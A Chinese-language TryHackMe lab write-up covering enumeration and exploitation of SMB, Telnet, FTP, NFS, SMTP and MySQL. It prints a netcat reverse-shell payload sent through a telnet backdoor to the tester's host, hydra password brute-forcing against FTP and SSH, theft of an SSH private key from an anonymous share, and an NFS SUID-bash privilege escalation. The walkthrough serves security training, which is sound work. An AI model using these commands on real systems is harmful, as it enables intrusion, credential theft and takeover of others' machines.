---
title: 常见的服务与漏洞
icon: file
order: 4
author: Miktu
date: 2024-07-22
category:
  - TryHackMe
tags:
  - network
  - 渗透
sticky: true
star: true
copyright: MikTu
---
# SMB服务
## SMB介绍
SMB( Server Message Block) 服务器块 Protocol 
- 是一种客户端-服务器通信协议，用于共享网络上的文件、打印机、串行端口和其他资源的访问。
- SMB 协议被称为响应请求协议，这意味着它在客户端和服务器之间传输多个消息以建立连接。
- 客户端使用 TCP/IP（实际上是 RFC1001 和 RFC1002 中指定的 TCP/IP 上的 NetBIOS）、NetBEUI 或 IPX/SPX 连接到服务器。
- 建立连接后，客户端可以向服务器发送命令 (SMB)。
- 允许客户端访问共享、打开文件、读取和写入文件，以及通常执行您想要对文件系统执行的所有操作。
- 通过网络完成的。

![](../images/Pasted%20image%2020240715220703.png)

## SMB枚举（Enumerating）


- SMB通常是攻击者寻找敏感信息的绝佳起点-您可能会惊讶于这些共享中有时包含的内容。
- Enum4linux是一个用于枚举Windows和Linux系统上的SMB共享的工具。它基本上是samba包中工具的包装器，可以轻松地从目标中快速提取与SMB有关的信息。它已经安装在AttackBox上，但是如果你需要在自己的攻击机器上安装它，你可以从官方[github](https://github.com/portcullislabs/enum4linux)上安装。

````ad-info
title:Enum4Linux
- 语法：
    ```bash
    Enum4linux [options] ip
    ```
- Options

    ```bash
    -U  # 获取用户列表
    -M  # 获取机器（machine）列表
    -N  # 获取命名空间转储
    -S  # 获取共享列表
    -P  # 获取密码策略信息  
    -G  # 获取组和成员列表
    -a  # 所有上述（完整的基本枚举）
    ```
````


````ad-info
title: question 1
**使用nmap 扫描，发现有多少端口是开放的？**

![](../images/Pasted%20image%2020240715224017.png)  

**答案**：3

````


````ad-info
title:  question 2
**SMB在什么端口上运行**

![](../images/Pasted%20image%2020240715224017.png)  

**答案**：139/445

````



````ad-info
title:  question 3
**使用`Enum4Linux`,进行完整的枚举，对于新使用者，他们的名字是什么**

![](../images/Pasted%20image%2020240715231357.png)

# 解析
SMB 协议默认全局配置的预设工作组名称为Workgoup,所有匿名登陆的人，都会叫这个名字。

![](../images/Pasted%20image%2020240715232031.png)    

**答案**：workgroup

````


````ad-info
title:  question 4
**机器的名字？**
![](../images/Pasted%20image%2020240715232512.png)

 **答案**：POLOSMB
````


````ad-info
title:  question 5
**操作系统版本？**
![](../images/Pasted%20image%2020240715232629.png)

**答案**：POLOSMB
````

````ad-info
title:  question 6
**我们需要调查？**

# 解析
**这里问的是我们接下来要关注的是哪个目录**
![](../images/Pasted%20image%2020240715233037.png)
从`Share Enumeration（共享枚举）` 中可以看到有一个目录是连接成功（`OK`）的，因此我们接下来要重点关注

**答案**：profiles
````

## SMB漏洞利用（Exploit）

````ad-tip
title: 常见漏洞类型
- 服务本身漏洞：如[CVE-2017 - 7494](https://www.cvedetails.com/cve/CVE-2017-7494/)（远程代码执行）
- 配置错误导致漏洞：允许匿名访问共享
````


````ad-tip
title: 枚举关注点

 虽然SMB存在诸如 [CVE-2017 - 7494](https://www.cvedetails.com/cve/CVE-2017-7494/)之类的漏洞，可以利用SMB来远程执行代码，但您更常见的情况是：由于系统中的配置错误导致产生了入侵系统的最佳方式。

因此，我们在枚举阶段需要注意
 - SMB共享路径
 - 感兴趣的共享名称
````


````ad-tip
title:SMBClient

SMBClient 是 Samba 组件的一部分，是客户端用来访问SMB服务器资源的一个套件。可以在这里找到安装文档[here.](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

SMBClient 使用：
- 访问共享路径
```bash
smbclient //[IP]/[SHARE]
```

- 然后是`tags`
 ```text
 -U[name]: # 指定用户
 -p[prot]: # 指定端口
 ```
````


## 入侵过程
````ad-info
title: 尝试`Anonymous`用户登陆
```bash
smbclient //10.10.62.9/profiels -U anonymous -p 445
```
````

````ad-info
title: 查看有价值的文件
```bash
ls
```
![](../images/Pasted%20image%2020240716222004.png)

```ad-info
title: 注意
- `Work Form Home information.txt`
- `.ssh`   # 一个目录
- .bashrc 
```
````

````ad-info
title: 下载到本地并查看
```bash
get "Work Form Home information.txt"
```
```ad-info
title: 注意
需要允许当前用户读写执行的权限的目录下登陆`smb`，才能下载。
**如： 在kali用户下执行smbclient ，则只能在允许kali用户读写执行的目录下载并保存文件**
```

- 从文件内容可以看到是管理员为某人开通的`ssh` 远程访问的邮件，以此作为线索可知，我们下一步需要进入`.ssh`去查看密钥文件。
````

````ad-info
title: 获取ssh远程登陆权限

- 跳转到`.ssh`
- 下载私钥
- 查看公钥并从中获取用户名
- 将私钥放到本地`.ssh`目录下，尝试登陆
- 成功登陆获取到`flag`
![](../images/Pasted%20image%2020240716222751.png)
````

# Telnet 服务
##  Telnet介绍
Telnet是一种应用程序协议，它允许您使用telnet客户端连接到托管telnet服务器的远程计算机并在其上执行命令。

Telnet 以明文形式发送所有消息，并且没有特定的安全机制。因此，在许多应用程序和服务中，Telnet 在大多数实现中已被 SSH 取代。

## Telnet 使用
```bash
telnet [ip] [port]
```

**telnet 窗口执行命令，需要在命令执行前添加`.RUN`**

![](../images/Pasted%20image%2020240717215312.png)



## Telnet枚举（Enumerating）

````ad-info
title: 端口枚举 1

1. 有多少端口在此及其开启？
    - `1`
2. 哪个端口是开启的？

    - `8012`
3. 这个端口是未分配的，但任然给出了他正在使用的协议类型，是什么协议？
    - `TCP`
4. 不用`-p-`参数，扫描结果中有几个端口开启？
    - `0`


```bash
sudo nmap -p- 10.10.86.243


Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-22 12:43 UTC
Nmap scan report for ip-10-10-86-243.eu-west-1.compute.internal (10.10.86.243)
Host is up (0.00070s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
8012/tcp open  unknown
MAC Address: 02:3C:80:9F:77:B3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.55 seconds


```

````


````ad-info 
title: 信息枚举 2
1. 根据返回信息，我们认为这个端口可以来干什么？
    -  `abackdoor`
2. 它会属于谁？
    - `Skidy`
```bash
sudo nmap  -sV -p8012  10.10.86.243
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-22 12:50 UTC
Nmap scan report for ip-10-10-86-243.eu-west-1.compute.internal (10.10.86.243)
Host is up (0.00019s latency).

PORT     STATE SERVICE VERSION
8012/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.93%I=7%D=7/22%Time=669E559B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20command
SF:s\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\
...
```

````


## Telnet 漏洞利用

###  telnet 登陆

````ad-info
title: 登陆telnet
1. 登陆telnet，我们收到了什么欢迎信息?  


```bash
telnet 10.10.86.243 8012

Trying 10.10.86.243...
Connected to 10.10.86.243.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
```
**答案：**`SKIDY'S BACKDOOR` 
````

````ad-info
title: 尝试运行命令
2. 尝试运行命令，会有返回信息吗？
**答案：**`N`
````

````ad-info
title: 命令运行结果验证
3. 启动tcpdump 侦听器，侦听 `ping`操作的`ICMP`流量：`sudo tcpdump local-ip proto \\icmp -i eth0`Telnet 会话中运行“ping [local IP] -c 1” 看看本地是否能够收到`ping`流量？
```bash
sudo tcpdump ip proto \\icmp -i eth0  # 本地IP
 .RUN ping -c 1 10.10.33.28   # telnet会话窗口执行命令，记得加`.RUN`
```
**答案：** `Y`
````

###  Payload生产
````ad-info
title: 生成`payload`
4. 用`msfvenom` 生成反向`shell` 的payload，`payload`以哪个单词开头 ？
   
```bash
msfvenom  -p cmd/unix/reverse_netcat lhost=10.10.33.28  lport=4444 R

[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 101 bytes
mkfifo /tmp/mbilfvt; nc 10.10.33.28 4444 0</tmp/mbilfvt | /bin/sh >/tmp/mbilfvt 2>&1; rm /tmp/mbilfvt
``` 
**答案：**`mkfifo`
````


### 反弹Shell

````ad-info
title: 反弹shell,获取`flag`

5. 本地侦听有效攻击载荷"`payload`"中对应的本地端口：
```bash
nc -lvp 4444
```
6. Telnet 会话界面运行"`pyaload`"
```bash
.RUN mkfifo /tmp/mbilfvt; nc 10.10.33.28 4444 0</tmp/mbilfvt | /bin/sh >/tmp/mbilfvt 2>&1; rm /tmp/mbilfvt
```
7. 目标主机的"`flag`"

```bash
THM{y0u_g0t_th3_t3ln3t_fl4g}
```
````


# FTP服务

## FTP介绍

### 什么是FTP？
文件传输协议(File Transfer Protocol)，顾名思义，是一种允许通过网络远程传输文件的协议。它使用客户端-服务器模型来执行此操作，并且-正如我们稍后将讨论的那样-以非常有效的方式中继命令和数据。
### FTP是如何工作的？
典型的FTP会话使用两个通道运行：
- 命令（有时称为控制）通道
- 数据通道。

顾名思义，命令通道用于传输命令以及对这些命令的回复，而数据通道用于传输数据。

FTP使用客户端-服务器协议运行。客户端启动与服务器的连接，服务器验证提供的任何登录凭据，然后打开会话。

当会话打开时，客户端可以在服务器上执行FTP命令。

### 主动vs被动(**Active vs Passive**)

- 在Active FTP连接中，客户端打开一个端口并侦听。服务器需要主动连接到它。
- 在Passive FTP连接中，服务器打开一个端口并侦听（被动），客户端连接到它。

**更多详情：**

FTP互联网工程任务组网站：[https://www.ietf.org/rfc/rfc959.txt](https://www.ietf.org/rfc/rfc959.txt)IETF

## FTP 枚举（Enumerating）

### 方法
我们将利用**匿名FTP登录**，看看我们**可以访问哪些文件** ——以及它们**是否包含任何可能允许我们在系统上弹出`shell`的信息**。这是CTF挑战中的常见途径，模仿了FTP服务器的真实的粗放的配置实现。

### 前提
当我们要登录到FTP服务器时，我们需要确保系统上安装了FTP客户端。在大多数Linux操作系统上，默认情况下应该安装一个，比如卡利或鹦鹉操作系统。您可以通过在控制台中键入“`ftp`”来测试是否有一个。如果你看到一个提示，上面写着：“`ftp>`”，那么你的系统上有一个正在工作的FTP客户端。如果没有，只需使用“`sudo apt install ftp`”来安装一个。

### 替代枚举方法

值得注意的是，一些易受攻击的in. ftpd版本和其他一些FTP服务器变体返回对“cwd”命令的不同响应 存在和不存在的主目录。这可以被利用，因为您可以在身份验证前发出cwd命令，如果有主目录，很可能有一个用户帐户。虽然这种bug主要存在于遗留系统中，但作为利用FTP的一种方式，它值得了解。  

此漏洞记录在：[https://www.exploit-db.com/exploits/20745](https://www.exploit-db.com/exploits/20745)

###  端口扫描
````ad-info
title: 端口扫描
**问题** : 目标机器上开启了几个端口？
```bash
sudo nmap -T -p- 10.10.136.9

sudo nmap -T -p21,8012  10.10.136.9
```

**答案**： `2`
````


````ad-info
title: 端口扫描
**问题** : ftp在哪个**端口**上运行？


**答案**： `21`
````



````ad-info
title: 端口扫描
**问题** : 上面运行的是什么FTP变体？


**答案**： `vsftpd`
````

###  尝试登陆
太好了，现在我们知道我们正在处理什么类型的FTP服务器了，我们可以检查一下我们是否能够匿名登录FTP服务器。我们可以通过在控制台中输入“ftp[IP]”来做到这一点，并输入“`anonymous`“，没有密码。


````ad-info
title: 尝试登陆
**问题** :匿名FTP目录中文件的名称是什么？
```bash
ftp 10.10.136.9
ftp>ls
```
**答案**： `PUBLIC_NOTICE.txt`
````


````ad-info
title: 尝试登陆
**问题** :我们认为可能的用户名可能是什么？
```bash
ftp>get PUBLIC_NOTICE.txt
ftp>exit
cat PUBLIC_NOTICE.txt
```
**答案**： `mike`
````

##  FTP 漏洞利用
#### 暴力破解
````ad-info
title: 暴力破解
```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.136.9 ftp
```

**命令格式：**
`hydra -t 4 -l [user] -P [path to dictionary] -vV [machine IP] [protocol]`

|参数|说明|
|-|-|
|hydra|暴力破解工具“九头蛇”|
| -t 4|每个目标的并行连接数|
| -l[user]| 指向您试图入侵的帐户的用户|
| -P [path to dictionary] | 指向包含可能密码列表的文件|
| -vV| 将详细模式设置为非常详细，显示每次尝试的登录+通过组合|
|[machine IP]|目标机器的IP地址|
|ftp / protocol |设置协议|

````

#### 获取flag
![](../images/Pasted%20image%2020240723224314.png)

# NFS服务
## 简介
**什么是NFS**
- 网络文件系统（Network File System）
- 通过将原创文件系统的全部或一部分挂载到本地，实现共享。
- 几乎和访问本地文件一样。
- 默认端口：`2049`
**NFS是怎么工作的**

我们 不需要太详细地了解技术交流 能够有效地利用NFS-但是如果这是 你感兴趣，我会推荐这个资源：[https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html)

- 首先，客户端将请求从远程主机在本地目录上挂载目录，就像它可以挂载物理设备一样。然后，挂载服务将使用RPC连接到相关的挂载守护程序。

- 服务器检查用户是否有权限挂载已请求的任何目录。然后它将返回一个文件句柄，该句柄唯一标识服务器上的每个文件和目录。、
- 如果有人想使用NFS访问文件，则会对服务器上的NFSD（NFS守护程序）进行RPC调用。此调用采用以下参数：

-  The file handle（文件句柄）
-  The name of the file to be accessed（ 要访问的文件的名称）
-  The user's, user ID（用户的，用户ID）
-  The user's group ID  （用户的组ID）

**在什么情况下使用NFS**

可以在运行Windows的计算机和其他非Windows操作系统（如Linux、MacOS或UNIX）之间传输文件。

**更多信息：**

Here are some resources that explain the technical implementation, and working of, NFS in more detail than I have covered here.

这里有一些资源比我在这里介绍的更详细地解释了NFS的技术实现和工作。

[https://www.datto.com/blog/what-is-nfs-file-share/](https://www.datto.com/blog/what-is-nfs-file-share/)  

[https://www.datto.com/blog/what-is-nfs-file-share/](https://www.datto.com/blog/what-is-nfs-file-share/)  

[http://nfs.sourceforge.net/](http://nfs.sourceforge.net/)

[http://nfs.sourceforge.net/](http://nfs.sourceforge.net/)

[https://wiki.archlinux.org/index.php/NFS](https://wiki.archlinux.org/index.php/NFS)

[https://wiki.archlinux.org/index.php/NFS](https://wiki.archlinux.org/index.php/NFS)

![](../images/Pasted%20image%2020240723225139.png)![](../images/Pasted%20image%2020240723225201.png)
## NFS枚举

### 前置条件
安装 `nfs-common`
```bash
sudo apt install nfs-common
```


### 端口扫描


````ad-info
title:端口扫描
**问题** ：对您选择的端口进行彻底扫描，有多少端口打开？
```bash
sudo nmap -T4 10.10.9.126

sudo nmap -A -p-  10.10.9.126 
```
**答案**： `7`
```ad-tip
- 直接对全端口进行指纹扫描（-A）速度较慢，我们可以先对目标进行端口发现，然后再进行指纹扫描。
- 在实验环境进行端口发现时，建议指定速度参数（`-T`，1-5级，级别越高，速度越快，噪声越大 ）。
```

````


### 查找NFS共享
````ad-info
title: 查找NFS共享
**问题** ：现在，使用 /usr/sbin/showmount-e[IP]列出NFS共享，可见共享的名称是什么？

```bash
/usr/sbin/showmount -e 10.10.9.126 
```
**答案**： `/home`
````

### 挂载NFS目录

````ad-info
title: 挂载NFS目录

**问题** ： NFS共享目录中的文件名称是什么？

```bash
mkdir /tmp/mount
sudo mount -t nfs 10.10.9.126:/home /tmp/mount/ -nolock
cd /tmp/mount
```
**答案**： `cappucino`

```ad-tip
**共享`NFS` 是目标主机的`/home`，`/home`一般保存用户主目录，且主目录与用户名一致，由此可知用户名也为`cappucino`**
```

- 命令格式：`sudo mount -t nfs IP:share /tmp/mount/ -nolock`

| 参数       | 说明                         |
| -------- | -------------------------- |
| sudo     | 以root身份                    |
| mount    | 运行执行挂载命令                   |
| -t nfs   | 要挂载的设备类型，然后指定它是NFS         |
| IP:share | NFS服务器的IP地址，以及我们希望挂载的共享的名称 |
| -nolock  | 指定不使用NLM锁定                 |

````


###  信息收集

![](../images/Pasted%20image%2020240723232134.png)


## NFS利用

- 下载目标主机的 `/bin/bash`文件；

```bash
scp -i key_name username@MACHINE_IP:/bin/bash ~/Downloads/bash
```


-  修改文件权限，使其包含`SUID`权限


```bash
sudo chmod +s  ~/Downloads/bash
```

-  上传到NFS共享文件`/home/cappucino`，运行`./bash -p`完成提权

```bash
cp  ~/Downloads/bash  /tmp/mount/cappucino
```

![](../images/Pasted%20image%2020240723233158.png)



# SMTP 

## 简介
简单邮件传输协议(Simple Mail Transfer Protocol)
- `SMTP`：用于发送邮件
- `POP/IMAP`： 用于接收邮件

````ad-info
title: SMTP(Simple Mail Transfer Protocol)
- `SMTP`：用于发送邮件
    - port：`25`（ssl：各厂商有差异）
    - 需要用户名密码验证谁在通过SMTP发送邮件
    - 发送邮件
    - 如果外发邮件无法送达，将邮件返回给发件人
````


````ad-info
title:POP(Post Office Protocol)
- `POP`(邮件协议)： 用于接收邮件
    - prot ：`110`（ssl：各厂商有差异）
    - 更简单
    - 从邮件服务器下载邮件到客户端，并被服务器删除
    - 客户端的操作不会反馈到服务器
````


````ad-info
title:IMAP(Internet Message Access Protocol)
- `IMAP`(互联网邮件访问协议)： 用于接收邮件
    - prot：`143`（ssl：各厂商有差异）
    - 一个交互式的协议
    - 实时同步下载服务器上的新邮件到本地。
    - 客户端的操作都会反馈到服务器
````

### 运行环境

- windows
- linux（一些SMTP变体可以在Linux上运行）

### SMTP 正常通信的时序图
![](../images/Pasted%20image%2020240725212559.png)

- **第一步：SMTP握手（SMTP handshake）**
    - 确认存活：返回状态码`220`
    - 开始握手：发送“`HELO`”（`HELO<mail.com>`） ,返回状态码`250`
    - 声明发件人及收件人信息：
        - 发送 “`MAIL FROM: <Bob@gmail.com>`” ，返回状态码`250`
        - 发送 “`PCPT To: <Bob@gmail.com>`” ，返回状态码`250`
- **第二步： 传递邮件**
    - 发件SMTP服务器发送`DATA`，声明接下来要发送的是邮件内容，并确定对方是否准备就绪。
    - 返回状态码：`354`，表明已准备好
    - 开始传输邮件内容：
        - 一行一行发送
        - 以 `.` 未结束，以返回状态码`250`来确认消息是否完整。
        - 发送端服务器接受到返回的状态码`250`，确认对方完整接受信息，开始关闭连接
        - 如果收件人的SMTP服务器无法访问或不可用，电子邮件会被放入SMTP队列（`SMTP queue`）
- **第三步：关闭连接**
    - 发件SMTP服务器，发送`QUIT`到对端服务器，返回状态码 `221`，双方断开连接

### 更多信息
以下资源更详细地解释了`SMTP`协议。[https://www.afternerd.com/blog/smtp/](https://www.afternerd.com/blog/smtp/)
-  浏览器发送邮件，使`HTTP`协议，跨邮件服务器的邮件传输（如gmail.com到yahoo.com任然遵循`SMTP`协议）

###  题目

![](../images/Pasted%20image%2020240725222208.png)
![](../images/Pasted%20image%2020240725222225.png)

## SMTP枚举

###  准备 

配置不佳或易受攻击的邮件服务器通常可以为黑客提供初始的入侵入口，但在发起攻击之前，我们希望对服务器进行指纹识别，以使我们的目标尽可能精确。
我们将使用`MetaSploit`中的“`smtp_version`”模块来做到这一点。顾名思义，它将扫描一系列IP地址，并确定它遇到的任何邮件服务器的版本。

#### 枚举用户
`SMTP` 有两个允许枚举用户的内部命令，使用这些SMTP命令，我们可以显示有效用户的列表：
- `VRFY`：确认有效用户的名称
- `EXPN`：显示用户别名的实际地址和电子邮件列表（邮件列表）

#### 工具与方法

- `telnet`连接，并手动执行命令
- `Metasploit` (`msfconsole`)工具`smtp_enum`模块 （OSCP不让用）：[点此学习](https://tryhackme.com/module/metasploit)
- `smtp-user-enum`: 
    - 通过“`SMTP` 服务“枚举`Solaris`系统上 操作系统级别的用户;
    - 枚举是通过检查对`VRFY`、`EXPN`和`RCPT TO`命令的响应来执行的。
### 枚举
#### 利用metasploit 自动化工具
````ad-info
title: 端口扫描
**问题** ：SMTP 运行在哪个端口？
```bash
sudo nmap -T4 -p- 10.10.209.213
sudo nmap -A -p25 10.10.209.213
```

**答案**： `25`

````


````ad-info
title: Metsploit 启动
**问题** ：我们用什么命令来启动Metasploit命令行？
**答案**：
```bash
mfsconsole
```
````


````ad-info
title: `smtp_version`模块
**问题** ：搜索模块“smtp_version”，它的完整模块名称是什么？

```bash
msf6 > search smtp_version
```
**答案**：`auxiliary/scanner/smtp/smtp_version`
````

````ad-info
title: 配置参数
**问题** ：选择模块后，怎么列出参数？

```bash
msf6 > use 0
msf6 auxiliary(scanner/smtp/smtp_version) > options
```
**答案**：options
````

````ad-info
title:配置参数
**问题** ： 查看参数，一切正常吗？我们应该配置什么参数？

```bash
msf6 auxiliary(scanner/smtp/smtp_version) > options
```
**答案**：`RHOSTS`
````

````ad-info
title: 配置参数并扫描
**问题** ：将`RHOSTS`设置为目标主机的正确值，然后运行漏洞利用，系统邮件的名称是什么？
```bash
msf6 auxiliary(scanner/smtp/smtp_version) > set RHOSTS 10.10.209.213
RHOSTS => 10.10.209.213
msf6 auxiliary(scanner/smtp/smtp_version) > options
msf6 auxiliary(scanner/smtp/smtp_version) > run 

[+] 10.10.209.213:25      - 10.10.209.213:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.209.213:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
**答案**：`polosmtp.home`

````


````ad-info
title: 配置参数并扫描
**问题** ：哪个邮件传输代理（MTA）正在运行SMTP服务器？这需要一些外部研究。

**答案**：`Postfix`

````

````ad-info
title: SMTP利用
**问题** ：好的。我们现在已经有了大量关于目标系统的信息，可以进入下一阶段了。让我们搜索模块“smtp_enum”，它的完整模块名称是什么？

```bash
msf6 auxiliary(scanner/smtp/smtp_version) > search smtp_enum

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum

```

**答案**：`auxiliary/scanner/smtp/smtp_enum`

````


````ad-info
title: 引用字典
引用字典`/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt`（一般`kali`和`Parrot`）都会默认安装，也可以用`sudo apt install seclist` 命令安装。

**问题** ：我们需要将什么选项设置为单词列表的路径？
```bash
msf6 auxiliary(scanner/smtp/smtp_version) > use 0
msf6 auxiliary(scanner/smtp/smtp_enum) > options
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt


USER_FILE => /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
```
**答案**：`USER_FILE`

````

````ad-info
title: 引用字典
**问题** ：一旦我们设置了这个选项，我们需要设置的另一个基本参数是什么？

```bash
msf6 auxiliary(scanner/smtp/smtp_enum) > options


msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.209.213
RHOSTS => 10.10.209.213
```
**答案**：`RHOSTS`

````


````ad-info
title: 爆破用户名
**问题** ：好了！现在结束了，返回什么用户名？
```bash
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.209.213:25      - 10.10.209.213:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.209.213:25      - 10.10.209.213:25 Users found: administrator
[*] 10.10.209.213:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smtp/smtp_enum) > 

```
**答案**：`administrator`

````







####  OSCP 手动枚举

````ad-info
 title: NSE
```
nmap 192.168.1.101 --script=smtp* -p 25

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip
```
````

````ad-info
title: 用户枚举

```
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip

for server in $(cat smtpmachines); do echo "******************" $server "*****************"; smtp-user-enum -M VRFY -U userlist.txt -t $server;done #for multiple servers
# For multiple servers
```
````

````ad-info
title: 连接

```
telnet $ip 25
```

````

````ad-info

title: 检查用户是否存在的命令

```
VRFY root
```

````

````ad-info

title: 询问服务器用户是否属于邮件列表的命令

```
EXPN root
```
````


## 利用SMTP

````ad-info
title: 爆破ssh用户密码
```bash
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.209.213 ssh
```
````

````ad-info
title:问题

1. 我们在枚举阶段找到的用户的密码是什么？ 

    **答案** ：`alejandro`

3. 太好了！现在，让我们以用户身份SSH服务器，smtp. txt的内容是什么？ 

    **答案**：`THM{who_knew_email_servers_were_c00l?}`
````


#  MySQL

MySQL是基于结构化查询语言（SQL）的关系数据库管理系统（relational database management system（RDBMS））。

- Database ：数据库是结构化数据的集合 
- RDBMS：一种软件或服务，基于关系模型创建和管理数据库。“关系”一词只是指存储在数据集中的数据被组织成表格。每个表格都以某种方式与彼此的“主键”或其他“关键”因素相关。
- SQL：结构化查询语言。

MySQL 作为一个 RDBMS，由服务器和有助于管理 MySQL 数据库的实用程序组成。服务器处理所有数据库指令，例如创建、编辑和访问数据。它接受和管理这些请求并使用MySQL协议进行通信。这 整个过程可以分为以下几个阶段：
- MySQL创建一个数据库来存储和操作数据，定义每个表的关系。
- 客户端通过在 SQL 中发出特定语句来发出请求。
- 服务器将使用所请求的任何信息来响应客户端。

MySQL可以运行在各种平台上，无论是Linux还是Windows。它通常用作许多著名网站的后端数据库，并构成 LAMP 堆栈的重要组件，其中包括：Linux、Apache、MySQL 和 PHP。

以下是一些资源，它们比我在这里介绍的更详细地解释了MySQL的技术实现和工作：

[https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html) 

[https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html) 

[https://www.w3schools.com/php/php_mysql_intro.asp](https://www.w3schools.com/php/php_mysql_intro.asp)

[https://www.w3schools.com/php/php_mysql_intro.asp](https://www.w3schools.com/php/php_mysql_intro.asp)

````ad-info
title: 题目
1. Mysql是什么类型的软件？ **答案:  `relational database management system`（关系型数据库管理系统）**
2. Mysql是基于什么语言的？ **答案：`sql`**
3. Mysql使用的是什么模型进行通信的？ **答案：`client-server` **\
4. Mysql通常应用在什么地方？ **答案： `back end database`（后端数据库）**
5. 什么社交软件的后端数据库是使用的Mysql？**答案：`Facebook`**
````

## 枚举

- Mysql 一般不会成为第一个攻击点;
- 一般会通过枚举其他服务，获得一些凭据，然后利用这些凭据来枚举和利用`Mysql`
- 本场景假设在枚举web服务器时，获取到了凭据：“`root`： `password`”。在尝试登录SSH失败后，您决定尝试登录MySQL。
- 您需要在系统上安装Mysql-client来连接远程服务器：`sudo apt install default-mysql-client`
- 利用工具使用`Metasploit`

